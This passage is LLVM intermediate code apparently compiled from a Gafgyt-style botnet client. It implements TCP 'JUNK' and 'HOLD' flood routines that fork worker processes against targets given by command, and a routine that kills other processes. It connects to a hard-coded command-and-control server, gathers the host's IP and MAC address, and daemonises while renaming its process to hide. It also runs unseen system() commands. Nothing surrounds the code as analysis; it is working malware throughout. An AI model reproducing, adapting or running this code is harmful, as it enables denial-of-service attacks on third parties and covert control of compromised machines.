  %583 = getelementptr inbounds i8*, i8** %582, i64 1
  %584 = load i8*, i8** %583, align 8
  store i8* %584, i8** %35, align 8
  %585 = load i8**, i8*** %4, align 8
  %586 = getelementptr inbounds i8*, i8** %585, i64 2
  %587 = load i8*, i8** %586, align 8
  %588 = call i32 @atoi(i8* noundef %587) #11
  store i32 %588, i32* %36, align 4
  %589 = load i8**, i8*** %4, align 8
  %590 = getelementptr inbounds i8*, i8** %589, i64 3
  %591 = load i8*, i8** %590, align 8
  %592 = call i32 @atoi(i8* noundef %591) #11
  store i32 %592, i32* %37, align 4
  %593 = load i8*, i8** %35, align 8
  %594 = call i8* @strstr(i8* noundef %593, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #11
  %595 = icmp ne i8* %594, null
  br i1 %595, label %596, label %617

596:                                              ; preds = %581
  %597 = load i8*, i8** %35, align 8
  %598 = call i8* @strtok(i8* noundef %597, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %598, i8** %38, align 8
  br label %599

599:                                              ; preds = %614, %596
  %600 = load i8*, i8** %38, align 8
  %601 = icmp ne i8* %600, null
  br i1 %601, label %602, label %616

602:                                              ; preds = %599
  %603 = call i32 @listFork()
  %604 = icmp ne i32 %603, 0
  br i1 %604, label %614, label %605

605:                                              ; preds = %602
  %606 = load i8*, i8** %38, align 8
  %607 = load i32, i32* %36, align 4
  %608 = load i32, i32* %37, align 4
  call void @sendJUNK(i8* noundef %606, i32 noundef %607, i32 noundef %608)
  %609 = load i8*, i8** %38, align 8
  %610 = load i32, i32* %36, align 4
  %611 = load i32, i32* %37, align 4
  call void @sendHOLD(i8* noundef %609, i32 noundef %610, i32 noundef %611)
  %612 = load i32, i32* @mainCommSock, align 4
  %613 = call i32 @close(i32 noundef %612)
  call void @_exit(i32 noundef 0) #14
  unreachable

614:                                              ; preds = %602
  %615 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %615, i8** %38, align 8
  br label %599, !llvm.loop !63

616:                                              ; preds = %599
  br label %628

617:                                              ; preds = %581
  %618 = call i32 @listFork()
  %619 = icmp ne i32 %618, 0
  br i1 %619, label %620, label %621

620:                                              ; preds = %617
  br label %815

621:                                              ; preds = %617
  %622 = load i8*, i8** %35, align 8
  %623 = load i32, i32* %36, align 4
  %624 = load i32, i32* %37, align 4
  call void @sendJUNK(i8* noundef %622, i32 noundef %623, i32 noundef %624)
  %625 = load i8*, i8** %35, align 8
  %626 = load i32, i32* %36, align 4
  %627 = load i32, i32* %37, align 4
  call void @sendHOLD(i8* noundef %625, i32 noundef %626, i32 noundef %627)
  call void @_exit(i32 noundef 0) #14
  unreachable

628:                                              ; preds = %616
  br label %629

629:                                              ; preds = %628, %559
  %630 = load i8**, i8*** %4, align 8
  %631 = getelementptr inbounds i8*, i8** %630, i64 0
  %632 = load i8*, i8** %631, align 8
  %633 = call i32 @strcmp(i8* noundef %632, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i64 0, i64 0)) #11
  %634 = icmp ne i32 %633, 0
  br i1 %634, label %756, label %635

635:                                              ; preds = %629
  %636 = load i32, i32* %3, align 4
  %637 = icmp slt i32 %636, 6
  br i1 %637, label %680, label %638

638:                                              ; preds = %635
  %639 = load i8**, i8*** %4, align 8
  %640 = getelementptr inbounds i8*, i8** %639, i64 3
  %641 = load i8*, i8** %640, align 8
  %642 = call i32 @atoi(i8* noundef %641) #11
  %643 = icmp eq i32 %642, -1
  br i1 %643, label %680, label %644

644:                                              ; preds = %638
  %645 = load i8**, i8*** %4, align 8
  %646 = getelementptr inbounds i8*, i8** %645, i64 2
  %647 = load i8*, i8** %646, align 8
  %648 = call i32 @atoi(i8* noundef %647) #11
  %649 = icmp eq i32 %648, -1
  br i1 %649, label %680, label %650

650:                                              ; preds = %644
  %651 = load i8**, i8*** %4, align 8
  %652 = getelementptr inbounds i8*, i8** %651, i64 4
  %653 = load i8*, i8** %652, align 8
  %654 = call i32 @atoi(i8* noundef %653) #11
  %655 = icmp eq i32 %654, -1
  br i1 %655, label %680, label %656

656:                                              ; preds = %650
  %657 = load i8**, i8*** %4, align 8
  %658 = getelementptr inbounds i8*, i8** %657, i64 4
  %659 = load i8*, i8** %658, align 8
  %660 = call i32 @atoi(i8* noundef %659) #11
  %661 = icmp sgt i32 %660, 32
  br i1 %661, label %680, label %662

662:                                              ; preds = %656
  %663 = load i32, i32* %3, align 4
  %664 = icmp sgt i32 %663, 6
  br i1 %664, label %665, label %671

665:                                              ; preds = %662
  %666 = load i8**, i8*** %4, align 8
  %667 = getelementptr inbounds i8*, i8** %666, i64 6
  %668 = load i8*, i8** %667, align 8
  %669 = call i32 @atoi(i8* noundef %668) #11
  %670 = icmp slt i32 %669, 0
  br i1 %670, label %680, label %671

671:                                              ; preds = %665, %662
  %672 = load i32, i32* %3, align 4
  %673 = icmp eq i32 %672, 8
  br i1 %673, label %674, label %681

674:                                              ; preds = %671
  %675 = load i8**, i8*** %4, align 8
  %676 = getelementptr inbounds i8*, i8** %675, i64 7
  %677 = load i8*, i8** %676, align 8
  %678 = call i32 @atoi(i8* noundef %677) #11
  %679 = icmp slt i32 %678, 1
  br i1 %679, label %680, label %681

680:                                              ; preds = %674, %665, %656, %650, %644, %638, %635
  br label %815

681:                                              ; preds = %674, %671
  %682 = load i8**, i8*** %4, align 8
  %683 = getelementptr inbounds i8*, i8** %682, i64 1
  %684 = load i8*, i8** %683, align 8
  store i8* %684, i8** %39, align 8
  %685 = load i8**, i8*** %4, align 8
  %686 = getelementptr inbounds i8*, i8** %685, i64 2
  %687 = load i8*, i8** %686, align 8
  %688 = call i32 @atoi(i8* noundef %687) #11
  store i32 %688, i32* %40, align 4
  %689 = load i8**, i8*** %4, align 8
  %690 = getelementptr inbounds i8*, i8** %689, i64 3
  %691 = load i8*, i8** %690, align 8
  %692 = call i32 @atoi(i8* noundef %691) #11
  store i32 %692, i32* %41, align 4
  %693 = load i8**, i8*** %4, align 8
  %694 = getelementptr inbounds i8*, i8** %693, i64 4
  %695 = load i8*, i8** %694, align 8
  %696 = call i32 @atoi(i8* noundef %695) #11
  store i32 %696, i32* %42, align 4
  %697 = load i8**, i8*** %4, align 8
  %698 = getelementptr inbounds i8*, i8** %697, i64 5
  %699 = load i8*, i8** %698, align 8
  store i8* %699, i8** %43, align 8
  %700 = load i32, i32* %3, align 4
  %701 = icmp eq i32 %700, 8
  br i1 %701, label %702, label %707

702:                                              ; preds = %681
  %703 = load i8**, i8*** %4, align 8
  %704 = getelementptr inbounds i8*, i8** %703, i64 7
  %705 = load i8*, i8** %704, align 8
  %706 = call i32 @atoi(i8* noundef %705) #11
  br label %708

707:                                              ; preds = %681
  br label %708

708:                                              ; preds = %707, %702
  %709 = phi i32 [ %706, %702 ], [ 10, %707 ]
  store i32 %709, i32* %44, align 4
  %710 = load i32, i32* %3, align 4
  %711 = icmp sgt i32 %710, 6
  br i1 %711, label %712, label %717

712:                                              ; preds = %708
  %713 = load i8**, i8*** %4, align 8
  %714 = getelementptr inbounds i8*, i8** %713, i64 6
  %715 = load i8*, i8** %714, align 8
  %716 = call i32 @atoi(i8* noundef %715) #11
  br label %718

717:                                              ; preds = %708
  br label %718

718:                                              ; preds = %717, %712
  %719 = phi i32 [ %716, %712 ], [ 0, %717 ]
  store i32 %719, i32* %45, align 4
  %720 = load i8*, i8** %39, align 8
  %721 = call i8* @strstr(i8* noundef %720, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #11
  %722 = icmp ne i8* %721, null
  br i1 %722, label %723, label %743

723:                                              ; preds = %718
  %724 = load i8*, i8** %39, align 8
  %725 = call i8* @strtok(i8* noundef %724, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %725, i8** %46, align 8
  br label %726

726:                                              ; preds = %740, %723
  %727 = load i8*, i8** %46, align 8
  %728 = icmp ne i8* %727, null
  br i1 %728, label %729, label %742

729:                                              ; preds = %726
  %730 = call i32 @listFork()
  %731 = icmp ne i32 %730, 0
  br i1 %731, label %740, label %732

732:                                              ; preds = %729
  %733 = load i8*, i8** %46, align 8
  %734 = load i32, i32* %40, align 4
  %735 = load i32, i32* %41, align 4
  %736 = load i32, i32* %42, align 4
  %737 = load i8*, i8** %43, align 8
  %738 = load i32, i32* %45, align 4
  %739 = load i32, i32* %44, align 4
  call void @sendTCP(i8* noundef %733, i32 noundef %734, i32 noundef %735, i32 noundef %736, i8* noundef %737, i32 noundef %738, i32 noundef %739)
  call void @_exit(i32 noundef 0) #14
  unreachable

740:                                              ; preds = %729
  %741 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %741, i8** %46, align 8
  br label %726, !llvm.loop !64

742:                                              ; preds = %726
  br label %755

743:                                              ; preds = %718
  %744 = call i32 @listFork()
  %745 = icmp ne i32 %744, 0
  br i1 %745, label %746, label %747

746:                                              ; preds = %743
  br label %815

747:                                              ; preds = %743
  %748 = load i8*, i8** %39, align 8
  %749 = load i32, i32* %40, align 4
  %750 = load i32, i32* %41, align 4
  %751 = load i32, i32* %42, align 4
  %752 = load i8*, i8** %43, align 8
  %753 = load i32, i32* %45, align 4
  %754 = load i32, i32* %44, align 4
  call void @sendTCP(i8* noundef %748, i32 noundef %749, i32 noundef %750, i32 noundef %751, i8* noundef %752, i32 noundef %753, i32 noundef %754)
  call void @_exit(i32 noundef 0) #14
  unreachable

755:                                              ; preds = %742
  br label %756

756:                                              ; preds = %755, %629
  %757 = load i8**, i8*** %4, align 8
  %758 = getelementptr inbounds i8*, i8** %757, i64 0
  %759 = load i8*, i8** %758, align 8
  %760 = call i32 @strcmp(i8* noundef %759, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.84, i64 0, i64 0)) #11
  %761 = icmp ne i32 %760, 0
  br i1 %761, label %793, label %762

762:                                              ; preds = %756
  store i32 0, i32* %47, align 4
  store i64 0, i64* %48, align 8
  br label %763

763:                                              ; preds = %789, %762
  %764 = load i64, i64* %48, align 8
  %765 = load i64, i64* @numpids, align 8
  %766 = icmp ult i64 %764, %765
  br i1 %766, label %767, label %792

767:                                              ; preds = %763
  %768 = load i32*, i32** @pids, align 8
  %769 = load i64, i64* %48, align 8
  %770 = getelementptr inbounds i32, i32* %768, i64 %769
  %771 = load i32, i32* %770, align 4
  %772 = icmp ne i32 %771, 0
  br i1 %772, label %773, label %788

773:                                              ; preds = %767
  %774 = load i32*, i32** @pids, align 8
  %775 = load i64, i64* %48, align 8
  %776 = getelementptr inbounds i32, i32* %774, i64 %775
  %777 = load i32, i32* %776, align 4
  %778 = call i32 @getpid() #12
  %779 = icmp ne i32 %777, %778
  br i1 %779, label %780, label %788

780:                                              ; preds = %773
  %781 = load i32*, i32** @pids, align 8
  %782 = load i64, i64* %48, align 8
  %783 = getelementptr inbounds i32, i32* %781, i64 %782
  %784 = load i32, i32* %783, align 4
  %785 = call i32 @kill(i32 noundef %784, i32 noundef 9) #12
  %786 = load i32, i32* %47, align 4
  %787 = add nsw i32 %786, 1
  store i32 %787, i32* %47, align 4
  br label %788

788:                                              ; preds = %780, %773, %767
  br label %789

789:                                              ; preds = %788
  %790 = load i64, i64* %48, align 8
  %791 = add i64 %790, 1
  store i64 %791, i64* %48, align 8
  br label %763, !llvm.loop !65

792:                                              ; preds = %763
  br label %793

793:                                              ; preds = %792, %756
  %794 = load i8**, i8*** %4, align 8
  %795 = getelementptr inbounds i8*, i8** %794, i64 0
  %796 = load i8*, i8** %795, align 8
  %797 = call i32 @strcmp(i8* noundef %796, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i64 0, i64 0)) #11
  %798 = icmp ne i32 %797, 0
  br i1 %798, label %800, label %799

799:                                              ; preds = %793
  call void @exit(i32 noundef 0) #16
  unreachable

800:                                              ; preds = %793
  %801 = load i8**, i8*** %4, align 8
  %802 = getelementptr inbounds i8*, i8** %801, i64 0
  %803 = load i8*, i8** %802, align 8
  %804 = call i32 @strcmp(i8* noundef %803, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.86, i64 0, i64 0)) #11
  %805 = icmp ne i32 %804, 0
  br i1 %805, label %815, label %806

806:                                              ; preds = %800
  %807 = call i32 @system(i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.87, i64 0, i64 0))
  %808 = call i32 @system(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.88, i64 0, i64 0))
  %809 = call i32 @system(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i64 0, i64 0))
  %810 = call i32 @system(i8* noundef getelementptr inbounds ([23 x i8], [23 x i8]* @.str.90, i64 0, i64 0))
  %811 = call i32 @system(i8* noundef getelementptr inbounds ([20 x i8], [20 x i8]* @.str.91, i64 0, i64 0))
  %812 = call i32 @system(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.92, i64 0, i64 0))
  %813 = call i32 @system(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.93, i64 0, i64 0))
  %814 = call i32 @system(i8* noundef getelementptr inbounds ([22 x i8], [22 x i8]* @.str.94, i64 0, i64 0))
  br label %815

815:                                              ; preds = %806, %800, %746, %680, %620, %580, %553, %516, %481, %442, %421, %386, %356, %300, %240, %203, %176, %141, %114, %109, %104, %89, %77, %63, %54
  ret void
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind
declare i32 @kill(i32 noundef, i32 noundef) #4

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8* noundef) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32 noundef) #10

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %4, i8 0, i64 4096, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

7:                                                ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 noundef %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

10:                                               ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

15:                                               ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

16:                                               ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

19:                                               ; preds = %16, %15
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* noundef %20, i8* noundef %24) #12
  store i32 443, i32* %3, align 4
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %27 = call i8* @strchr(i8* noundef %26, i32 noundef 58) #11
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

29:                                               ; preds = %19
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %31 = call i8* @strchr(i8* noundef %30, i32 noundef 58) #11
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* noundef %32) #11
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %35 = call i8* @strchr(i8* noundef %34, i32 noundef 58) #11
  store i8 0, i8* %35, align 1
  br label %36

36:                                               ; preds = %29, %19
  %37 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #12
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 noundef %38, i8* noundef %39, i32 noundef %40, i32 noundef 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

43:                                               ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

44:                                               ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

45:                                               ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #12
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

16:                                               ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %17, i8 0, i64 16, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.95, i64 0, i64 0)) #12
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 noundef zeroext 53) #15
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 noundef %24, %struct.sockaddr* noundef %25, i32 noundef 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

29:                                               ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

30:                                               ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 noundef %31, %struct.sockaddr* noundef %32, i32* noundef %6) #12
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

37:                                               ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.96, i64 0, i64 0), i32 noundef 0)
  store i32 %41, i32* %7, align 4
  br label %42

42:                                               ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* noundef %43, i32 noundef 4096, i32 noundef %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

47:                                               ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %49 = call i8* @strstr(i8* noundef %48, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.97, i64 0, i64 0)) #11
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

51:                                               ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %52, i8** %9, align 8
  br label %53

53:                                               ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

58:                                               ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53, !llvm.loop !66

61:                                               ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

63:                                               ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %64, i8 0, i64 4096, i1 false)
  br label %42, !llvm.loop !67

65:                                               ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 noundef %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

71:                                               ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.5* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i64 0, i64 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %76 = call i8* @strcpy(i8* noundef %74, i8* noundef %75) #12
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 noundef %77, i64 noundef 35111, %struct.ifreq* noundef %11) #12
  store i32 0, i32* %10, align 4
  br label %79

79:                                               ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

82:                                               ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.6* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i64 0, i64 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

94:                                               ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79, !llvm.loop !68

97:                                               ; preds = %79
  br label %98

98:                                               ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 noundef %99)
  br label %101

101:                                              ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32 noundef, %struct.sockaddr* noundef, i32* noundef) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32 noundef, i64 noundef, ...) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.98, i64 0, i64 0)
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @main(i32 noundef %0, i8** noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.99, i64 0, i64 0), i8** %6, align 8
  %25 = call i32 @access(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.100, i64 0, i64 0), i32 noundef 0) #12
  %26 = icmp ne i32 %25, -1
  br i1 %26, label %27, label %28

27:                                               ; preds = %2
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.101, i64 0, i64 0), i8** %6, align 8
  br label %29

28:                                               ; preds = %2
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.102, i64 0, i64 0), i8** %6, align 8
  br label %29

29:                                               ; preds = %28, %27
  %30 = call i8* @getBuild()
  %31 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.103, i64 0, i64 0), i8* noundef %30)
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  %37 = load i8*, i8** %36, align 8
  %38 = call i64 @strlen(i8* noundef %37) #11
  %39 = call i8* @strncpy(i8* noundef %34, i8* noundef getelementptr inbounds ([1 x i8], [1 x i8]* @.str.99, i64 0, i64 0), i64 noundef %38) #12
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 0
  %42 = load i8*, i8** %41, align 8
  %43 = load i8*, i8** %6, align 8
  %44 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %42, i8* noundef %43) #12
  %45 = load i8*, i8** %6, align 8
  %46 = ptrtoint i8* %45 to i64
  %47 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 noundef 15, i64 noundef %46, i32 noundef 0, i32 noundef 0, i32 noundef 0)
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %49 = call i32 @getpid() #12
  %50 = xor i32 %48, %49
  call void @srand(i32 noundef %50) #12
  %51 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %52 = call i32 @getpid() #12
  %53 = xor i32 %51, %52
  call void @init_rand(i32 noundef %53)
  %54 = call i32 @getOurIP()
  %55 = call i32 @fork() #12
  store i32 %55, i32* %7, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %60

57:                                               ; preds = %29
  %58 = load i32, i32* %7, align 4
  %59 = call i32 @waitpid(i32 noundef %58, i32* noundef %9, i32 noundef 0)
  call void @exit(i32 noundef 0) #16
  unreachable

60:                                               ; preds = %29
  %61 = load i32, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %74, label %63

63:                                               ; preds = %60
  %64 = call i32 @fork() #12
  store i32 %64, i32* %8, align 4
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %66, label %67

66:                                               ; preds = %63
  call void @exit(i32 noundef 0) #16
  unreachable

67:                                               ; preds = %63
  %68 = load i32, i32* %8, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %71, label %70

70:                                               ; preds = %67
  br label %72

71:                                               ; preds = %67
  br label %72

72:                                               ; preds = %71, %70
  br label %73

73:                                               ; preds = %72
  br label %75

74:                                               ; preds = %60
  br label %75

75:                                               ; preds = %74, %73
  br label %76

76:                                               ; preds = %75
  %77 = call i32 @setsid() #12
  %78 = call i32 @chdir(i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i64 0, i64 0)) #12
  %79 = call void (i32)* @signal(i32 noundef 13, void (i32)* noundef inttoptr (i64 1 to void (i32)*)) #12
  br label %80

80:                                               ; preds = %373, %83, %76
  %81 = call i32 @initConnection()
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %83, label %85

83:                                               ; preds = %80
  %84 = call i32 @sleep(i32 noundef 5)
  br label %80

85:                                               ; preds = %80
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = call i8* @getBuild()
  %88 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %86, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.105, i64 0, i64 0), i8* noundef %87)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %89

89:                                               ; preds = %372, %294, %216, %178, %85
  %90 = load i32, i32* @mainCommSock, align 4
